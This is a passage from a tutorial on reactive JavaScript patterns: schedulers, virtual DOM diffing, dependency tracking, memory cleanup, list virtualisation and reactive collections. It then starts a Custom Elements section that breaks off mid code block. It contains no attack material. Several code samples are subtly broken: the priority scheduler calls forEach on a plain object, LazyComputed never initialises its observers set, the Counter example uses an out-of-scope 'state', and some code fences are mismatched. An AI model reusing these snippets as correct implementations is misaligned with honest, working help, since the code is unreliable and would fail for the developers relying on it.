Different updates carry different priorities—user interactions demand immediate response while background updates can defer. React's concurrent mode implements this with lanes.

```javascript
const Priority = {
  IMMEDIATE: 0,
  USER_BLOCKING: 1,
  NORMAL: 2,
  LOW: 3,
  IDLE: 4
};

class PriorityScheduler {
  constructor() {
    this.queues = new Map();
    Priority.forEach((_, priority) => {
      this.queues.set(priority, []);
    });
  }
  
  schedule(effect, priority = Priority.NORMAL) {
    this.queues.get(priority).push(effect);
    this.flush(priority);
  }
  
  flush(maxPriority) {
    for (let p = Priority.IMMEDIATE; p <= maxPriority; p++) {
      const queue = this.queues.get(p);
      while (queue.length > 0) {
        const effect = queue.shift();
        effect();
      }
    }
  }
}
```

### DOM Update Strategies

#### Virtual DOM Diffing

Virtual DOM maintains a lightweight representation of the actual DOM. Updates compute differences between old and new virtual trees, then apply minimal changes to the real DOM.

```javascript
function diff(oldVNode, newVNode) {
  const patches = [];
  
  // Different types - replace
  if (oldVNode.type !== newVNode.type) {
    return [{ type: 'REPLACE', newVNode }];
  }
  
  // Text nodes
  if (typeof oldVNode === 'string') {
    if (oldVNode !== newVNode) {
      return [{ type: 'TEXT', text: newVNode }];
    }
    return patches;
  }
  
  // Props
  const propPatches = diffProps(oldVNode.props, newVNode.props);
  if (propPatches) {
    patches.push({ type: 'PROPS', props: propPatches });
  }
  
  // Children
  const childPatches = diffChildren(oldVNode.children, newVNode.children);
  patches.push(...childPatches);
  
  return patches;
}

function diffChildren(oldChildren, newChildren) {
  const patches = [];
  const maxLength = Math.max(oldChildren.length, newChildren.length);
  
  for (let i = 0; i < maxLength; i++) {
    if (!oldChildren[i]) {
      patches.push({ type: 'INSERT', index: i, vnode: newChildren[i] });
    } else if (!newChildren[i]) {
      patches.push({ type: 'REMOVE', index: i });
    } else {
      const childPatches = diff(oldChildren[i], newChildren[i]);
      if (childPatches.length > 0) {
        patches.push({ type: 'PATCH', index: i, patches: childPatches });
      }
    }
  }
  
  return patches;
}
```

#### Keyed Reconciliation

Keys enable efficient reordering and identification of elements across renders. The algorithm uses a longest-increasing-subsequence approach to minimize DOM moves.

```javascript
function reconcileChildren(oldChildren, newChildren, container) {
  const oldKeyToIndex = new Map();
  const newKeyToIndex = new Map();
  
  oldChildren.forEach((child, i) => {
    if (child.key != null) oldKeyToIndex.set(child.key, i);
  });
  
  newChildren.forEach((child, i) => {
    if (child.key != null) newKeyToIndex.set(child.key, i);
  });
  
  const toMove = [];
  const toRemove = [];
  const toCreate = [];
  
  // Find moves and removes
  for (let i = 0; i < oldChildren.length; i++) {
    const oldChild = oldChildren[i];
    if (oldChild.key != null) {
      const newIndex = newKeyToIndex.get(oldChild.key);
      if (newIndex == null) {
        toRemove.push(i);
      } else if (newIndex !== i) {
        toMove.push({ from: i, to: newIndex, child: oldChild });
      }
    }
  }
  
  // Find creates
  for (let i = 0; i < newChildren.length; i++) {
    const newChild = newChildren[i];
    if (newChild.key != null && !oldKeyToIndex.has(newChild.key)) {
      toCreate.push({ index: i, child: newChild });
    }
  }
  
  // Apply operations
  toRemove.forEach(index => {
    container.removeChild(container.children[index]);
  });
  
  toMove.forEach(({ from, to }) => {
    const node = container.children[from];
    container.insertBefore(node, container.children[to]);
  });
  
  toCreate.forEach(({ index, child }) => {
    const node = createElement(child);
    container.insertBefore(node, container.children[index]);
  });
}
```

#### Fine-Grained Reactive DOM Updates

Instead of diffing, fine-grained reactivity directly binds reactive primitives to specific DOM nodes. Only the affected nodes update when dependencies change.

```javascript
function createTextBinding(element, compute) {
  createEffect(() => {
    element.textContent = compute();
  });
}

function createAttrBinding(element, attr, compute) {
  createEffect(() => {
    const value = compute();
    if (value == null) {
      element.removeAttribute(attr);
    } else {
      element.setAttribute(attr, value);
    }
  });
}

function createClassBinding(element, classes) {
  Object.entries(classes).forEach(([className, compute]) => {
    createEffect(() => {
      element.classList.toggle(className, compute());
    });
  });
}

// Usage
const [count, setCount] = createSignal(0);
const doubled = () => count() * 2;

const span = document.createElement('span');
createTextBinding(span, () => `Count: ${count()}, Doubled: ${doubled()}`);
```

### Dependency Tracking Patterns

#### Automatic Dependency Collection

During effect execution, all accessed reactive values automatically register as dependencies. This eliminates explicit dependency arrays but requires careful handling of conditional logic.

```javascript
class DependencyTracker {
  constructor() {
    this.activeEffect = null;
    this.dependencies = new WeakMap();
    this.subscribers = new WeakMap();
  }
  
  track(target, key) {
    if (!this.activeEffect) return;
    
    let depsMap = this.dependencies.get(target);
    if (!depsMap) {
      this.dependencies.set(target, (depsMap = new Map()));
    }
    
    let deps = depsMap.get(key);
    if (!deps) {
      depsMap.set(key, (deps = new Set()));
    }
    
    deps.add(this.activeEffect);
    
    // Store reverse mapping
    let effectDeps = this.subscribers.get(this.activeEffect);
    if (!effectDeps) {
      this.subscribers.set(this.activeEffect, (effectDeps = new Set()));
    }
    effectDeps.add(deps);
  }
  
  trigger(target, key) {
    const depsMap = this.dependencies.get(target);
    if (!depsMap) return;
    
    const deps = depsMap.get(key);
    if (!deps) return;
    
    deps.forEach(effect => {
      if (effect !== this.activeEffect) {
        effect();
      }
    });
  }
  
  effect(fn) {
    const effect = () => {
      this.cleanup(effect);
      this.activeEffect = effect;
      try {
        fn();
      } finally {
        this.activeEffect = null;
      }
    };
    
    effect();
    return effect;
  }
  
  cleanup(effect) {
    const deps = this.subscribers.get(effect);
    if (deps) {
      deps.forEach(dep => dep.delete(effect));
      deps.clear();
    }
  }
}
```

#### Derived State and Memoization

Computed values cache results and only recompute when dependencies change. This prevents unnecessary recalculations in derived state chains.

```javascript
function createComputed(compute) {
  let value;
  let dirty = true;
  let observers = new Set();
  
  const computed = () => {
    if (currentEffect) {
      observers.add(currentEffect);
    }
    
    if (dirty) {
      const oldEffect = currentEffect;
      currentEffect = () => {
        dirty = true;
        observers.forEach(obs => obs());
      };
      value = compute();
      currentEffect = oldEffect;
      dirty = false;
    }
    
    return value;
  };
  
  return computed;
}

// Usage
const [a, setA] = createSignal(1);
const [b, setB] = createSignal(2);

const sum = createComputed(() => {
  console.log('computing sum');
  return a() + b();
});

const doubled = createComputed(() => {
  console.log('computing doubled');
  return sum() * 2;
});

createEffect(() => {
  console.log('doubled:', doubled()); // Only logs once
});

setA(5); // Logs: computing sum, computing doubled, doubled: 14
```

#### Conditional Dependencies

When effects contain conditional logic, dependencies change based on execution paths. The tracking system must handle dynamic dependency graphs.

```javascript
const [show, setShow] = createSignal(true);
const [name, setName] = createSignal('Alice');
const [age, setAge] = createSignal(25);

createEffect(() => {
  if (show()) {
    console.log(`Name: ${name()}`);
  } else {
    console.log(`Age: ${age()}`);
  }
});

// Initially depends on: show, name
setName('Bob'); // Triggers effect

setShow(false); // Switches branch
// Now depends on: show, age (name no longer tracked)

setName('Charlie'); // Does NOT trigger effect
setAge(30); // Triggers effect
```

### Change Detection Strategies

#### Push-Based Detection

Changes propagate immediately from source to dependents. Each mutation triggers synchronous or scheduled updates through the dependency graph.

```javascript
class PushReactive {
  constructor(value) {
    this._value = value;
    this._dependents = new Set();
  }
  
  get() {
    if (currentComputation) {
      this._dependents.add(currentComputation);
      currentComputation.dependencies.add(this);
    }
    return this._value;
  }
  
  set(newValue) {
    if (this._value !== newValue) {
      this._value = newValue;
      this._notify();
    }
  }
  
  _notify() {
    this._dependents.forEach(dep => dep.recompute());
  }
}

class Computation {
  constructor(fn) {
    this.fn = fn;
    this.dependencies = new Set();
    this.recompute();
  }
  
  recompute() {
    // Clear old dependencies
    this.dependencies.forEach(dep => {
      dep._dependents.delete(this);
    });
    this.dependencies.clear();
    
    // Run computation and collect new dependencies
    const oldComputation = currentComputation;
    currentComputation = this;
    this.value = this.fn();
    currentComputation = oldComputation;
  }
}
```

#### Pull-Based Detection

Updates occur lazily when values are accessed. Dirty flags mark stale computations, which recompute only upon read.

```javascript
class LazyComputed {
  constructor(compute) {
    this.compute = compute;
    this.value = undefined;
    this.dirty = true;
    this.dependencies = new Set();
  }
  
  get() {
    if (this.dirty) {
      // Clear old dependencies
      this.dependencies.forEach(dep => {
        dep.observers.delete(this);
      });
      this.dependencies.clear();
      
      // Recompute
      currentComputation = this;
      this.value = this.compute();
      currentComputation = null;
      this.dirty = false;
    }
    
    if (currentComputation) {
      this.observers.add(currentComputation);
      currentComputation.dependencies.add(this);
    }
    
    return this.value;
  }
  
  markDirty() {
    if (!this.dirty) {
      this.dirty = true;
      this.observers.forEach(obs => obs.markDirty());
    }
  }
}
```

#### Zone-Based Detection

Zones (popularized by Angular) intercept asynchronous operations and trigger change detection when async tasks complete. This catches changes from event handlers, timers, and promises without explicit reactivity.

```javascript
class Zone {
  constructor(parent = null) {
    this.parent = parent;
    this.onLeave = [];
  }
  
  run(fn) {
    const prevZone = Zone.current;
    Zone.current = this;
    
    try {
      return fn();
    } finally {
      Zone.current = prevZone;
      this.onLeave.forEach(callback => callback());
    }
  }
  
  fork(config) {
    const child = new Zone(this);
    if (config.onLeave) {
      child.onLeave.push(config.onLeave);
    }
    return child;
  }
  
  static wrap(fn) {
    const zone = Zone.current;
    return function(...args) {
      return zone.run(() => fn.apply(this, args));
    };
  }
}

Zone.current = new Zone();

// Monkey-patch async APIs
const originalSetTimeout = window.setTimeout;
window.setTimeout = function(fn, delay, ...args) {
  return originalSetTimeout(Zone.wrap(fn), delay, ...args);
};

// Usage with change detection
const appZone = Zone.current.fork({
  onLeave: () => {
    detectChanges(); // Run change detection after async work
  }
});

appZone.run(() => {
  setTimeout(() => {
    state.value = 'updated';
    // detectChanges() automatically called when timeout completes
  }, 1000);
});
```

### Granularity Trade-offs

#### Component-Level Reactivity

Each component tracks its own dependencies and re-renders entirely when any dependency changes. Simpler to implement but less efficient for large component trees.

```javascript
class Component {
  constructor(props) {
    this.props = props;
    this.state = this.createState();
    this.element = null;
    this.effect = null;
  }
  
  createState() {
    return {};
  }
  
  setState(updates) {
    Object.assign(this.state, updates);
    this.scheduleUpdate();
  }
  
  scheduleUpdate() {
    if (!this.updateScheduled) {
      this.updateScheduled = true;
      queueMicrotask(() => {
        this.updateScheduled = false;
        this.update();
      });
    }
  }
  
  update() {
    const newElement = this.render();
    if (this.element) {
      patch(this.element, newElement);
    } else {
      this.element = newElement;
    }
  }
  
  mount(container) {
    this.effect = createEffect(() => {
      this.update();
      if (!this.element.parentNode) {
        container.appendChild(this.element);
      }
    });
  }
  
  render() {
    // Override in subclass
    throw new Error('render() must be implemented');
  }
}
```

#### Property-Level Reactivity

Individual properties within components track dependencies. Only the specific DOM nodes bound to changed properties update.

```javascript
function createReactiveComponent(setup) {
  return (props) => {
    const state = {};
    const computeds = {};
    
    // Create reactive state
    const setState = (key, value) => {
      const [get, set] = createSignal(value);
      state[key] = get;
      return set;
    };
    
    // Create computed properties
    const computed = (key, fn) => {
      computeds[key] = createComputed(fn);
      return computeds[key];
    };
    
    // Run setup
    const { template } = setup({ props, setState, computed });
    
    // Create template with fine-grained bindings
    return template();
  };
}

// Usage
const Counter = createReactiveComponent(({ setState, computed }) => {
  const setCount = setState('count', 0);
  const doubledCount = computed('doubled', () => state.count() * 2);
  
  return {
    template: () => {
      const div = document.createElement('div');
      
      const countSpan = document.createElement('span');
      createEffect(() => {
        countSpan.textContent = `Count: ${state.count()}`;
      });
      
      const doubledSpan = document.createElement('span');
      createEffect(() => {
        doubledSpan.textContent = `Doubled: ${doubledCount()}`;
      });
      
      const button = document.createElement('button');
      button.textContent = 'Increment';
      button.onclick = () => setCount(state.count() + 1);
      
      div.append(countSpan, doubledSpan, button);
      return div;
    }
  };
});
```

#### Node-Level Reactivity

The finest granularity—each reactive expression binds to a specific text node or attribute. Maximizes efficiency but increases memory overhead from numerous subscriptions.

```javascript
function h(tag, props, ...children) {
  return { tag, props, children };
}

function mount(vnode) {
  if (typeof vnode === 'string') {
    return document.createTextNode(vnode);
  }
  
  if (typeof vnode === 'function') {
    const textNode = document.createTextNode('');
    createEffect(() => {
      textNode.textContent = vnode();
    });
    return textNode;
  }
  
  const element = document.createElement(vnode.tag);
  
  // Mount props
  if (vnode.props) {
    Object.entries(vnode.props).forEach(([key, value]) => {
      if (key.startsWith('on')) {
        const event = key.slice(2).toLowerCase();
        element.addEventListener(event, value);
      } else if (typeof value === 'function') {
        createEffect(() => {
          element.setAttribute(key, value());
        });
      } else {
        element.setAttribute(key, value);
      }
    });
  }
  
  // Mount children
  vnode.children.forEach(child => {
    element.appendChild(mount(child));
  });
  
  return element;
}

// Usage - only the specific text node updates
const [count, setCount] = createSignal(0);
const [name, setName] = createSignal('Alice');

const app = h('div', null,
  h('span', null, () => `Count: ${count()}`), // Own text node
  h('span', null, () => `Name: ${name()}`),   // Own text node
  h('button', { onClick: () => setCount(count() + 1) }, 'Increment')
);

document.body.appendChild(mount(app));
```

### Memory Management

#### Subscription Cleanup

Effects must clean up subscriptions when unmounted or when dependencies change to prevent memory leaks.

```javascript
class EffectScope {
  constructor() {
    this.effects = new Set();
    this.cleanups = new Set();
  }
  
  run(fn) {
    const prevScope = currentScope;
    currentScope = this;
    try {
      return fn();
    } finally {
      currentScope = prevScope;
    }
  }
  
  registerEffect(effect) {
    this.effects.add(effect);
  }
  
  registerCleanup(cleanup) {
    this.cleanups.add(cleanup);
  }
  
  stop() {
    this.effects.forEach(effect => {
      if (effect.cleanup) effect.cleanup();
    });
    this.cleanups.forEach(cleanup => cleanup());
    this.effects.clear();
    this.cleanups.clear();
  }
}

let currentScope = null;

function createEffect(fn, options = {}) {
  const effect = {
    fn,
    cleanup: null,
    dependencies: new Set(),
    
    run() {
      if (this.cleanup) {
        this.cleanup();
        this.cleanup = null;
      }
      
      this.dependencies.forEach(dep => dep.delete(this));
      this.dependencies.clear();
      
      currentEffect = this;
      try {
        const cleanup = fn();
        if (typeof cleanup === 'function') {
          this.cleanup = cleanup;
        }
      } finally {
        currentEffect = null;
      }
    },
    
    stop() {
      if (this.cleanup) {
        this.cleanup();
      }
      this.dependencies.forEach(dep => dep.delete(this));
    }
  };
  
  if (currentScope) {
    currentScope.registerEffect(effect);
  }
  
  if (!options.lazy) {
    effect.run();
  }
  
  return effect;
}

// Usage
const scope = new EffectScope();
scope.run(() => {
  const [count, setCount] = createSignal(0);
  
  createEffect(() => {
    console.log(count());
    return () => console.log('cleanup');
  });
  
  createEffect(() => {
    const timer = setInterval(() => setCount(count() + 1), 1000);
    return () => clearInterval(timer);
  });
});

// Later - cleanup all effects
scope.stop();
```

#### WeakMap-Based Tracking

WeakMaps allow dependency tracking without preventing garbage collection of reactive objects when no external references remain.

```javascript
const targetMap = new WeakMap();

function track(target, key) {
  if (!activeEffect) return;
  
  let depsMap = targetMap.get(target);
  if (!depsMap) {
    targetMap.set(target, (depsMap = new Map()));
  }
  
  let dep = depsMap.get(key);
  if (!dep) {
    depsMap.set(key, (dep = new Set()));
  }
  
  dep.add(activeEffect);
}

function trigger(target, key) {
  const depsMap = targetMap.get(target);
  if (!depsMap) return;
  
  const dep = depsMap.get(key);
  if (dep) {
    dep.forEach(effect => effect());
  }
}

// When 'obj' is garbage collected, its entry in targetMap
// is automatically removed
let obj = reactive({ count: 0 });
createEffect(() => console.log(obj.count));

obj = null; // No more references - will be GC'd
```

#### Detached Node References

DOM nodes removed from the tree but still referenced by effects leak memory. Mutation observers or explicit cleanup prevent this.

```javascript
class DOMEffectManager {
  constructor() {
    this.nodeToEffects = new WeakMap();
    this.observer = new MutationObserver(mutations => {
      mutations.forEach(mutation => {
        mutation.removedNodes.forEach(node => {
          this.cleanupNode(node);
        });
      });
    });
    
    this.observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  }
  
  registerEffect(node, effect) {
    let effects = this.nodeToEffects.get(node);
    if (!effects) {
      this.nodeToEffects.set(node, (effects = new Set()));
    }
    effects.add(effect);
  }
  
  cleanupNode(node) {
    const effects = this.nodeToEffects.get(node);
    if (effects) {
      effects.forEach(effect => effect.stop());
      this.nodeToEffects.delete(node);
    }
    
    // Cleanup descendants
    node.querySelectorAll('*').forEach(child => {
      this.cleanupNode(child);
    });
  }
}

const effectManager = new DOMEffectManager();

function createDOMEffect(element, fn) {
  const effect = createEffect(fn);
  effectManager.registerEffect(element, effect);
  return effect;
}
```

### Performance Optimization Techniques

#### Debouncing and Throttling Updates

Limit update frequency for high-frequency events like scroll or resize using debounce or throttle wrappers.

```javascript
function createDebouncedSignal(initialValue, delay = 300) {
  const [signal, setSignal] = createSignal(initialValue);
  let timeoutId = null;
  
  const setDebounced = (value) => {
    if (timeoutId !== null) {
      clearTimeout(timeoutId);
    }
    
    timeoutId = setTimeout(() => {
      setSignal(value);
      timeoutId = null;
    }, delay);
  };
  
  return [signal, setDebounced];
}

function createThrottledSignal(initialValue, delay = 300) {
  const [signal, setSignal] = createSignal(initialValue);
  let lastCall = 0;
  let timeoutId = null;
  
  const setThrottled = (value) => {
    const now = Date.now();
    
    if (now - lastCall >= delay) {
      setSignal(value);
      lastCall = now;
    } else {
      if (timeoutId !== null) {
        clearTimeout(timeoutId);
      }
      
      timeoutId = setTimeout(() => {
        setSignal(value);
        lastCall = Date.now();
        timeoutId = null;
      }, delay - (now - lastCall));
    }
  };
  
  return [signal, setThrottled];
}

// Usage
const [searchQuery, setSearchQuery] = createDebouncedSignal('', 500);

input.addEventListener('input', (e) => {
  setSearchQuery(e.target.value);
});

createEffect(() => {
  // Only runs 500ms after user stops typing
  performSearch(searchQuery());
});
```

#### Batched Reads and Writes

Separate read and write phases prevent layout thrashing from interleaved reads and writes.

```javascript
class BatchedScheduler {
  constructor() {
    this.readQueue = [];
    this.writeQueue = [];
    this.scheduled = false;
  }
  
  read(fn) {
    this.readQueue.push(fn);
    this.schedule();
  }
  
  write(fn) {
    this.writeQueue.push(fn);
    this.schedule();
  }
  
  schedule() {
    if (!this.scheduled) {
      this.scheduled = true;
      requestAnimationFrame(() => this.flush());
    }
  }
  
	flush() {
	    // Execute all reads first
	    while (this.readQueue.length > 0) {
	        const read = this.readQueue.shift();
	        read();
	    }
	
	    // Then execute all writes
	    while (this.writeQueue.length > 0) {
	        const write = this.writeQueue.shift();
	        write();
	    }
	
	    this.scheduled = false;
	}
}

const scheduler = new BatchedScheduler();

// Prevents layout thrashing
elements.forEach(el => {
    scheduler.read(() => {
        const height = el.offsetHeight; // Read
        scheduler.write(() => {
            el.style.height = `${height * 2}px`; // Write
        });
    });
});
````

#### Memoization of Expensive Computations

Cache computed results based on input dependencies to avoid redundant calculations.

```javascript
function createMemo(compute, options = {}) {
  const { equals = Object.is } = options;
  let value;
  let prevDeps = [];
  let initialized = false;
  
  return (...deps) => {
    const depsChanged = !initialized || 
      deps.length !== prevDeps.length ||
      deps.some((dep, i) => !equals(dep, prevDeps[i]));
    
    if (depsChanged) {
      value = compute(...deps);
      prevDeps = deps;
      initialized = true;
    }
    
    return value;
  };
}

// Usage
const expensiveComputation = createMemo((list, filter) => {
  console.log('Computing...');
  return list
    .filter(item => item.includes(filter))
    .map(item => item.toUpperCase())
    .sort();
});

const [list, setList] = createSignal(['apple', 'banana', 'cherry']);
const [filter, setFilter] = createSignal('a');

createEffect(() => {
  const result = expensiveComputation(list(), filter());
  console.log(result); // Only recomputes when list or filter changes
});

setFilter('a'); // No recomputation - deps unchanged
setFilter('b'); // Recomputes
````

#### Virtualization for Large Lists

Only render visible items in large lists, dramatically reducing DOM nodes and improving performance.

```javascript
class VirtualList {
  constructor(container, options) {
    this.container = container;
    this.items = options.items || [];
    this.itemHeight = options.itemHeight;
    this.renderItem = options.renderItem;
    this.overscan = options.overscan || 3;
    
    this.scrollTop = 0;
    this.visibleNodes = new Map();
    
    this.setupContainer();
    this.setupScrollListener();
    this.render();
  }
  
  setupContainer() {
    this.viewport = document.createElement('div');
    this.viewport.style.overflow = 'auto';
    this.viewport.style.height = '100%';
    
    this.spacer = document.createElement('div');
    this.spacer.style.height = `${this.items.length * this.itemHeight}px`;
    
    this.content = document.createElement('div');
    this.spacer.appendChild(this.content);
    this.viewport.appendChild(this.spacer);
    this.container.appendChild(this.viewport);
  }
  
  setupScrollListener() {
    this.viewport.addEventListener('scroll', () => {
      this.scrollTop = this.viewport.scrollTop;
      this.render();
    });
  }
  
  getVisibleRange() {
    const viewportHeight = this.viewport.clientHeight;
    const start = Math.floor(this.scrollTop / this.itemHeight);
    const end = Math.ceil((this.scrollTop + viewportHeight) / this.itemHeight);
    
    return {
      start: Math.max(0, start - this.overscan),
      end: Math.min(this.items.length, end + this.overscan)
    };
  }
  
  render() {
    const { start, end } = this.getVisibleRange();
    const newNodes = new Map();
    
    // Render visible items
    for (let i = start; i < end; i++) {
      let node = this.visibleNodes.get(i);
      
      if (!node) {
        node = this.renderItem(this.items[i], i);
        node.style.position = 'absolute';
        node.style.top = `${i * this.itemHeight}px`;
        node.style.height = `${this.itemHeight}px`;
        this.content.appendChild(node);
      }
      
      newNodes.set(i, node);
    }
    
    // Remove nodes outside visible range
    this.visibleNodes.forEach((node, index) => {
      if (!newNodes.has(index)) {
        this.content.removeChild(node);
      }
    });
    
    this.visibleNodes = newNodes;
  }
  
  updateItems(items) {
    this.items = items;
    this.spacer.style.height = `${items.length * this.itemHeight}px`;
    this.visibleNodes.clear();
    this.content.innerHTML = '';
    this.render();
  }
}

// Usage
const list = new VirtualList(container, {
  items: Array.from({ length: 10000 }, (_, i) => `Item ${i}`),
  itemHeight: 40,
  renderItem: (item, index) => {
    const div = document.createElement('div');
    div.textContent = item;
    return div;
  }
});
```

### Advanced Patterns

#### Transient Updates

Some state changes shouldn't trigger reactivity—transient updates modify state without notifying observers until explicitly committed.

```javascript
class TransactionalSignal {
  constructor(initialValue) {
    this._value = initialValue;
    this._transientValue = initialValue;
    this._inTransaction = false;
    this._subscribers = new Set();
  }
  
  get value() {
    if (currentEffect) {
      this._subscribers.add(currentEffect);
    }
    return this._inTransaction ? this._transientValue : this._value;
  }
  
  set value(newValue) {
    if (this._inTransaction) {
      this._transientValue = newValue;
    } else {
      this._value = newValue;
      this._notify();
    }
  }
  
  beginTransaction() {
    this._inTransaction = true;
    this._transientValue = this._value;
  }
  
  commit() {
    if (this._inTransaction) {
      this._value = this._transientValue;
      this._inTransaction = false;
      this._notify();
    }
  }
  
  rollback() {
    if (this._inTransaction) {
      this._transientValue = this._value;
      this._inTransaction = false;
    }
  }
  
  _notify() {
    this._subscribers.forEach(effect => effect());
  }
}

// Usage
const count = new TransactionalSignal(0);

createEffect(() => {
  console.log('Count:', count.value);
});

count.beginTransaction();
count.value = 1; // No effect triggered
count.value = 2; // Still no effect
count.value = 3; // Still no effect
count.commit(); // Effect runs once with value 3
```

#### Reactive Contexts

Context provides reactive values through component trees without prop drilling, automatically tracking consumption for efficient updates.

```javascript
class ReactiveContext {
  constructor(defaultValue) {
    this.stack = [defaultValue];
  }
  
  provide(value, fn) {
    this.stack.push(value);
    try {
      return fn();
    } finally {
      this.stack.pop();
    }
  }
  
  consume() {
    return this.stack[this.stack.length - 1];
  }
}

function createContext(defaultValue) {
  const context = new ReactiveContext(defaultValue);
  
  return {
    Provider: (props) => {
      return context.provide(props.value, () => props.children);
    },
    
    Consumer: (fn) => {
      return fn(context.consume());
    },
    
    use: () => context.consume()
  };
}

// Usage
const ThemeContext = createContext({ color: 'blue', mode: 'light' });

const App = () => {
  const [theme, setTheme] = createSignal({ color: 'blue', mode: 'light' });
  
  return ThemeContext.Provider({
    value: theme(),
    children: ThemedComponent()
  });
};

const ThemedComponent = () => {
  return ThemeContext.Consumer(theme => {
    const div = document.createElement('div');
    createEffect(() => {
      div.style.color = theme.color;
      div.style.background = theme.mode === 'dark' ? '#000' : '#fff';
    });
    return div;
  });
};
```

#### Reactive Collections

Collections (arrays, sets, maps) require special handling to track granular changes like additions, removals, and reordering.

```javascript
function createReactiveArray(initial = []) {
  const array = [...initial];
  const subscribers = new Set();
  const indexMap = new Map(); // index -> Set of effects
  
  const notify = (type, index, value) => {
    subscribers.forEach(sub => sub({ type, index, value }));
    
    if (type === 'set' || type === 'delete') {
      const effects = indexMap.get(index);
      if (effects) effects.forEach(effect => effect());
    }
  };
  
  const handler = {
    get(target, prop) {
      if (prop === 'length') {
        if (currentEffect) subscribers.add(currentEffect);
        return target.length;
      }
      
      const index = Number(prop);
      if (Number.isInteger(index) && index >= 0) {
        if (currentEffect) {
          if (!indexMap.has(index)) {
            indexMap.set(index, new Set());
          }
          indexMap.get(index).add(currentEffect);
        }
      }
      
      const value = Reflect.get(target, prop);
      return typeof value === 'function' ? value.bind(proxy) : value;
    },
    
    set(target, prop, value) {
      const index = Number(prop);
      const oldLength = target.length;
      const result = Reflect.set(target, prop, value);
      
      if (Number.isInteger(index)) {
        notify('set', index, value);
        
        if (index >= oldLength) {
          notify('length', target.length, target.length);
        }
      }
      
      return result;
    },
    
    deleteProperty(target, prop) {
      const index = Number(prop);
      if (Number.isInteger(index)) {
        notify('delete', index, undefined);
      }
      return Reflect.deleteProperty(target, prop);
    }
  };
  
  const proxy = new Proxy(array, handler);
  
  // Enhance mutating methods
  ['push', 'pop', 'shift', 'unshift', 'splice'].forEach(method => {
    const original = array[method];
    proxy[method] = function(...args) {
      const result = original.apply(array, args);
      notify('method', -1, { method, args, result });
      subscribers.forEach(sub => sub({ type: method, args, result }));
      return result;
    };
  });
  
  return proxy;
}

// Usage
const [todos, setTodos] = createSignal(createReactiveArray([
  { id: 1, text: 'Learn reactivity', done: false }
]));

createEffect(() => {
  console.log('First todo:', todos()[0]); // Only tracks index 0
});

createEffect(() => {
  console.log('Todo count:', todos().length); // Only tracks length
});

todos().push({ id: 2, text: 'Build app', done: false }); // Triggers length effect
todos()[0] = { ...todos()[0], done: true }; // Triggers first todo effect
```

#### Error Boundaries for Effects

Isolate effect errors to prevent cascading failures through the reactive graph.

```javascript
class ErrorBoundary {
  constructor() {
    this.errors = new Map();
    this.onError = null;
  }
  
  wrap(effect, errorHandler) {
    const wrappedEffect = (...args) => {
      try {
        return effect(...args);
      } catch (error) {
        this.handleError(effect, error);
        if (errorHandler) {
          return errorHandler(error);
        }
      }
    };
    
    return wrappedEffect;
  }
  
  handleError(effect, error) {
    this.errors.set(effect, error);
    if (this.onError) {
      this.onError(error, effect);
    }
    console.error('Effect error:', error);
  }
  
  clearError(effect) {
    this.errors.delete(effect);
  }
  
  hasError(effect) {
    return this.errors.has(effect);
  }
}

const boundary = new ErrorBoundary();

boundary.onError = (error, effect) => {
  // Log to error tracking service
  console.error('Reactive error:', error);
};

function createSafeEffect(fn, fallback) {
  const wrappedFn = boundary.wrap(fn, fallback);
  return createEffect(wrappedFn);
}

// Usage
const [data, setData] = createSignal(null);

createSafeEffect(
  () => {
    console.log(data().property); // Might throw if data is null
  },
  (error) => {
    console.log('Fallback: No data available');
  }
);
```

This comprehensive overview covers the fundamental mechanisms, scheduling strategies, DOM update techniques, dependency tracking patterns, change detection approaches, granularity considerations, memory management, optimization techniques, and advanced patterns that constitute reactive DOM/JavaScript systems.

---

## Custom Elements (Web Components)

### Defining Custom Elements

Custom elements are defined using `window.customElements.define()`, which registers a new element with the browser. The element name must contain a hyphen to distinguish it from standard HTML elements and avoid naming conflicts.

```javascript
class MyElement extends HTMLElement {
  constructor() {
    super();
    // Initialization logic
  }
}

customElements.define('my-element', MyElement);
```

The class must extend `HTMLElement` or a subclass of it (like `HTMLButtonElement` for customized built-in elements). The constructor must call `super()` first before accessing `this`.

### Lifecycle Callbacks

Custom elements provide four lifecycle callbacks that hook into different stages of the element's existence:

**connectedCallback()** - Invoked when the element is inserted into the DOM. This is where you typically set up event listeners, fetch data, or start timers. Called each time the element is moved or reinserted.

**disconnectedCallback()** - Invoked when the element is removed from the DOM. Use this for cleanup: removing event listeners, canceling timers, or releasing resources. Not called when the page unloads.

**adoptedCallback()** - Invoked when the element is moved to a new document via `document.adoptNode()`. Rarely used outside of advanced scenarios involving iframes or document fragments.

**attributeChangedCallback(name, oldValue, newValue)** - Invoked when an observed attribute changes. Only attributes listed in the static `observedAttributes` getter trigger this callback.

```javascript
class ObservableElement extends HTMLElement {
  static get observedAttributes() {
    return ['data-value', 'disabled'];
  }

  attributeChangedCallback(name, oldValue, newValue) {
    if (name === 'data-value') {
      this.updateDisplay(newValue);
    }
  }
}
```

### Autonomous vs Customized Built-in Elements

**Autonomous custom elements** inherit from `HTMLElement` and are used as standalone tags. They define entirely new elements with custom behavior.

```javascript
class FancyButton extends HTMLElement {
  connectedCallback() {
    this.innerHTML = '<button>Click me</button>';
  }
}
customElements.define('fancy-button', FancyButton);
// Usage: <fancy-button></fancy-button>
```

**Customized built-in elements** extend existing HTML elements, inheriting their semantics and accessibility features. They require the `is` attribute for usage.

```javascript
class FancyButton extends HTMLButtonElement {
  connectedCallback() {
    this.classList.add('fancy');
  }
}
customElements.define('fancy-button', FancyButton, { extends: 'button' });
// Usage: <button is="fancy-button">Click me</button>
```

[Inference] Customized built-in elements maintain better accessibility and form participation because they inherit native element behavior, though browser support (particularly Safari) has been inconsistent historically.

### Shadow DOM Integration

Custom elements commonly use Shadow DOM to encapsulate styles and markup. The shadow root is typically attached in the constructor:

```javascript
class ShadowElement extends HTMLElement {
  constructor() {
    super();
    this.attachShadow({ mode: 'open' });
    this.shadowRoot.innerHTML = `
      <style>
        :host {
          display: block;
          padding: 1rem;
        }
      </style>
      <slot></slot>
    `;
  }
}
```

The `mode` can be `'open'` (accessible via `element.shadowRoot`) or `'closed'` (not accessible externally, though this provides limited security). The `delegatesFocus` option can be set to `true` to automatically focus the first focusable element when the host receives focus.

### Element Upgrade Process

Elements can be used in markup before their definition is registered. These elements exist in an "undefined" state until `customElements.define()` is called, at which point they're upgraded.

```javascript
// HTML parsed first
// <my-element>Content</my-element>

// Later, definition registered
customElements.define('my-element', MyElement);
// Element is now upgraded, constructor and connectedCallback run
```

You can wait for element definitions using `customElements.whenDefined()`:

```javascript
